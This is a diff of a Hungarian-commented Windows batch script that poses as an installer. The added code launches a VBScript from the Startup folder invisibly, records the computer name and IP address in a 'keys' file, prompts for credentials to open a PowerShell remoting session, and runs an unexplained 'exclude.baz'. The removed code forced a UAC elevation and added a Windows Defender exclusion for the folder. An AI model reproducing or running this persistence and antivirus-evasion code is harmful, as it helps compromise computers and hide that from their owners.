@@ -1,76 +1,65 @@
 @echo off
 setlocal enabledelayedexpansion
 
-REM Ellenorzi es kerdezi a rendszergazdai jogosultsagot
-
-NET SESSION >nul 2>&1
-IF %ERRORLEVEL% EQU 0 (
-    echo Rendszergazdai jogosultsagok megerositve. Folytatas...
-    goto admin_folytatas
-) ELSE (
-    echo Rendszergazdai jogosultsagok kerese...
-    goto ker_admin
-)
-
-
-:: nyelvfüggetlen célmappa
+:: ====== MAPPÁK ======
 set "TARGET=%PUBLIC%\Documents\keys"
 if not exist "%TARGET%" mkdir "%TARGET%"
 
-:: hozzon létre egy keys.txt filet, ha még nincs
+:: Keys.txt létrehozása, ha még nincs
 if not exist "%TARGET%\keys.txt" (
-    echo Created by installer > "%TARGET%\keys.txt")
-
+    echo Created by installer > "%TARGET%\keys.txt"
+)
 
 set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
-:: ha nincs ilyen mappa, hozza létre
-if not exist "%STARTUP_FOLDER%" (
-    mkdir "%STARTUP_FOLDER%"
-)
-:: >>> VBSCRIPT FUTTATÁSA LÁTHATATLANUL <<<
-echo [INFO] A sifustartup5sfgj.vbs inditasa WScript.Shell-lel...
-start "" "wscript.exe" "%STARTPU_FOLDER%\sifustartup5sfgj.vbs"
+:: Startup mappa létrehozása, ha nincs
+if not exist "%STARTUP_FOLDER%" mkdir "%STARTUP_FOLDER%"
+
+
+:: ====== VBSCRIPT FUTTATÁSA LÁTHATATLANUL ======
+echo [INFO] A sifustartup5sfgj.vbs inditasa...
+start "" "wscript.exe" "%STARTUP_FOLDER%\sifustartup5sfgj.vbs"
 echo [SIKER] VBScript elindult (háttérben).
 
-:: Számítógép neve (Megbízható módszer: %COMPUTERNAME%)
+
+:: ====== GÉPNÉV + IP ======
 set "GEPNEV=%COMPUTERNAME%"
 
-:: IPv4 cim
-for /f "tokens=14" %%a in ('ipconfig ^| findstr /i "IPv4"') do set "IP=%%a"
+for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /i "IPv4"') do (
+    set "TEMPIP=%%a"
+    set "IP=!TEMPIP: =!"
+)
 
----
 
-:: Mentés keys.txt-be
-:: EZ A BLOKK IRJA FELÜL AZ ELŐZŐ "Created by installer" TARTALMÚ FÁJLT!
+:: ====== KEYS.TXT FELÜLÍRÁSA ======
 (
     echo GEPNEV: !GEPNEV!
     echo IP: !IP!
 ) > "%TARGET%\keys.txt"
 
-echo [INFO] A keys.txt elkeszult a %TARGET% mappaban.
-echo [INFO] PowerShell Remoting elinditasa a %IP% cimen...
+echo [INFO] keys.txt frissítve.
+echo [INFO] PowerShell Remoting indítása: %IP%
 echo.
 
-:: POWERHSHELL REMOTING BLOKK
+
+:: ====== POWERSHELL REMOTING ======
 powershell.exe -Command "
     $user = Get-Credential;
     Write-Host 'Kapcsolodas a %IP% cimen levo gephez...';
     Enter-PSSession -ComputerName %IP% -Credential $user
 "
 
+
+:: ====== EXCLUDE.BAZ FUTTATÁSA ======
 echo.
-echo [INFO] A munkamenet befejezodott vagy megszakadt.
+echo [INFO] exclude.baz futtatása...
 
-:ker_admin
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
-    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
-    cscript //B "%temp%\getadmin.vbs"
-    exit
+if exist "%~dp0exclude.baz" (
+    start "" "%~dp0exclude.baz"
+    echo [SIKER] exclude.baz elinditva.
+) else (
+    echo [HIBA] exclude.baz nem található a bat mappájában!
+)
 
-:admin_folytatas
-    POWERSHELL -InputFormat None -OutputFormat None -NonInteractive -Command "Add-MpPreference -ExclusionPath '%TARGET%'"
-    echo Kizaras hozzaadva: oda
-    
 echo.
 pause
